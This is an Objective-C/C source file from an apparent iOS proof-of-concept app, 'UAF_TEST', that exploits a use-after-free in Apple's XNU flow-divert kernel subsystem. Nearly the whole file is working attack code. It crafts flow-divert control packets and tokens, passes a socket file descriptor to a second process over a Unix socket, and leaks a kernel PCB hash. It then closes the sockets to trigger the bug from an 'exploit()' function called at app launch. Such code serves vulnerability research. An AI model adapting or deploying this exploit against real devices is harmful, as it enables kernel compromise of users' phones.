//
//  main.m
//  UAF_TEST
//
//  Created by 风沐云烟 on 2023/12/27.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"
#include "poc.h"


#include <stdio.h>
#include <netinet/in.h>
#include <net/if.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <pthread/qos.h>
#include <sys/socket.h>
#include <pthread/pthread.h>
#include <sys/errno.h>
#include "kern_control.h"
#include "sys_domain.h"
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/un.h>

void sendingFD(int socket, int fd) {
    struct iovec iov[1];
    char dummy = '0'; // 用于填充辅助数据的字节
    char cmsg_buf[CMSG_SPACE(sizeof(int))];

    struct msghdr msg;
    memset(&msg, 0, sizeof(struct msghdr));

    // 设置辅助数据
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    struct cmsghdr *cmsg;
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));

    // 设置辅助数据中的文件描述符
    *(int *)CMSG_DATA(cmsg) = fd;

    // 设置发送缓冲区
    iov[0].iov_base = &dummy;
    iov[0].iov_len = 1;
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    // 发送消息
    if (sendmsg(socket, &msg, 0) == -1) {
        perror("sendmsg");
        exit(EXIT_FAILURE);
    }
}


void PreparingSending(int my_fd) {
    int testfd, client_sockfd;
    struct sockaddr_un addr;

    printf("my_FD:\t%d\n",my_fd);
    testfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (testfd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    
    // 设置套接字地址
    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
    
    // 绑定套接字到地址
    if (bind(testfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_un)) == -1) {
        perror("bind");
        exit(EXIT_FAILURE);
    }
    
    
    // 监听连接
    if (listen(testfd, 1) == -1) {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    
    // 接受连接请求
    printf("进程 A 正在等待连接...\n");
    client_sockfd = accept(testfd, NULL, NULL);
    if (client_sockfd == -1) {
        perror("accept");
        exit(EXIT_FAILURE);
    }
    printf("进程 A 收到连接请求\n");
    
    // 发送套接字文件描述符给进程 B
    printf("myFD:%d\n",my_fd);
    sendingFD(client_sockfd, my_fd);
    
    sleep(1);
    // 关闭连接
    close(client_sockfd);
    close(testfd);
    
}

int sock_fd[4];
uint32_t pcb_hash;

void do_token(void) {
    sock_fd[0] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock_fd[0] < 0) {
        perror("[do_token:socket]");
        exit(EXIT_FAILURE);
    }
    struct flow_divert_create_packet *packet = (struct flow_divert_create_packet*)calloc(1,sizeof(struct flow_divert_create_packet));
    
    packet->control_unit.Type = FLOW_DIVERT_TLV_CTL_UNIT;
    packet->control_unit.Length = htonl(4);
    packet->control_unit.Unit = htonl(0x0FFFFFFF);
    
    packet->aggregate_unit.Type = FLOW_DIVERT_TLV_AGGREGATE_UNIT;
    packet->aggregate_unit.Length = htonl(4);
    packet->aggregate_unit.Unit = htonl(0);
    
    packet->signing.Type = FLOW_DIVERT_TLV_SIGNING_ID;
    packet->signing.Length = htonl(4);
    packet->signing.ID = htonl(0);
    
    struct flow_divert_create_packet new_packet;
    memcpy(&new_packet,packet,sizeof(struct flow_divert_create_packet));
    
    
    setsockopt(sock_fd[0], SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, &new_packet, sizeof(new_packet));
    char to_BUF[0x40] = {0};
    socklen_t Length = 0x40;
    
    PreparingSending(sock_fd[0]);
//  listen(sock_fd[0],5); // update so->lastpid
    getsockopt(sock_fd[0], SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, to_BUF, &Length);
    pcb_hash = *(uint32_t*)(to_BUF + 14);
    printf("PCB_HASH_VAL:\t\t%#x\n",pcb_hash);
    sleep(1);
}


int sock_kctl[32];
void connect_kctl(int index) {
    sock_kctl[index] = socket(AF_SYSTEM,SOCK_DGRAM,SYSPROTO_CONTROL);
    if(sock_kctl[index] < 0) {
        perror("[connect_kctl:socket]");
        exit(EXIT_FAILURE);
    }
    struct sockaddr_ctl target;
    target.sc_len     = CTL_SIZE;
    target.sc_family  = AF_SYSTEM;
    target.ss_sysaddr = AF_SYS_CONTROL;
    
    struct ctl_info info;
    memset(&info,0,CTL_INFOSZ);
    strlcpy(info.ctl_name,CONTROL_NAME,sizeof(info.ctl_name));
    if(ioctl(sock_kctl[index],CTLIOCGINFO,&info) == -1) {
        perror("[ioctl]");
        exit(EXIT_FAILURE);
    }
    target.sc_id      = info.ctl_id;
    target.sc_unit    = 0x0FFFFFFF;

    if (connect(sock_kctl[index], (struct sockaddr *)&target, CTL_SIZE) == -1) {
        
        perror("[connect_kctl:connect]");
        exit(EXIT_FAILURE);
    }
    

}

void group_init(int fd) {
    char *mem = (char*)malloc(0x200);
    bzero(mem,0x200);
    uint32_t length;
    
    struct flow_divert_packet_header *init_packet = (struct flow_divert_packet_header*)mem;
    
    init_packet->packet_type = FLOW_DIVERT_PKT_GROUP_INIT;
    init_packet->conn_id = htonl(0);
    struct init_data *key_size = (struct init_data *)(mem + sizeof(struct flow_divert_packet_header));
    key_size->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    key_size->Length = htonl(4);
    *(uint32_t*)(key_size->to_BUF) = htonl(4);
    
    
    struct init_data *token = (struct init_data *)(mem + sizeof(struct flow_divert_packet_header) + 9);
    token->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    token->Length = htonl(4);
    *(uint32_t*)(token->to_BUF) = htonl(0xDEADBEEF);
    
    length = sizeof(struct flow_divert_packet_header) + 9 + 9;
    if(send(fd,mem,length,0) < 0) {
        perror("[group_init]");
        exit(EXIT_FAILURE);
    }
}

void exploit(void) {
    
    printf("Parent PID:%d\n",getpid());
    connect_kctl(0); // unit = 0xFFFF
    group_init(sock_kctl[0]); // init group for kctl_connect of flow-divert
    do_token();
    
    printf("Closing Socket\n");
    close(sock_fd[0]);
    close(sock_kctl[0]);

}


int main(int argc, char * argv[]) {
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    NSString *sharedFilePath = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.fmyy"].path;
    sharedFilePath = [sharedFilePath stringByAppendingPathComponent:@"SharedSocket.txt"];
    SOCKET_PATH = [sharedFilePath UTF8String];
    remove(SOCKET_PATH);
    exploit();
    
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
